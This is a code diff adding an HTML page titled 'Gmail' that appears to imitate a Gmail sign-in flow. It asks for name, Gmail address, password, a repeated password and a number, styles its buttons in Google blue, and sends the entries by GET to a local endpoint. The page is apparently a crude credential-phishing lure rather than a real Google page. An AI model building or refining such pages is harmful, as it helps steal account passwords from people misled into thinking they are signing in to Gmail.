@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Gmail</title>
+	</head>
+	<body style="background-color: black;">
+		<div class="process1">
+			<form  action="/api/index.json" method="GET">
+				<div id="a1">
+					<br><input type="text" name="username"></br>
+					<br><input type="text" name="lastname"></br>
+					<br><input type="Gmail" name="gmail"></br>
+					<br><input type="password" name="password"></br>
+					<br><input type="password" name="approve"/></br>
+				</div>
+				<div id="a2">
+					<input type="number" name="number"></br>
+					<button id="next" name="go">Next</button>
+				</div>
+			</form>
+				<p>
+		  			<button onclick="btnfun()" id="next" name="Next">Next</button>
+				</p>
+			
+
+		</div>
+	</body>
+	<script type="text/javascript">
+		var a1=document.getElementById("a1")
+		var a2=document.getElementById("a2")
+		var button=document.querySelector("p")
+		var x=0
+
+		const btnfun=function(){
+			document.getElementById("next")
+			fun()
+		}
+
+		var fun=function(){
+			x+=1
+			switch (x){
+				case 1:
+					a1.style.display="none"
+					a2.style.display="block"
+					button.style.display="none"
+					console.log(a2)
+					break;
+				
+
+			}
+			console.log(x)
+		}
+
+
+	</script>
+	<style type="text/css">
+		
+		.process1 {
+			background-color: white;
+			margin-top:200px;
+			border:1px solid;
+			border-radius: 10px;	
+			text-align: center;
+			margin-right: auto;
+			margin-left: auto;
+			width: 500px;
+			
+		}
+		.process1,input{
+			padding:6px;
+		}
+		#next {
+			width:100px;
+			height:35px;
+			background-color:#1a73e8;
+			border:none;
+			border-radius:4px;
+		}
+		#a2,#a3,#a4{
+			display:none;
+		}
+	</style>
+</html>
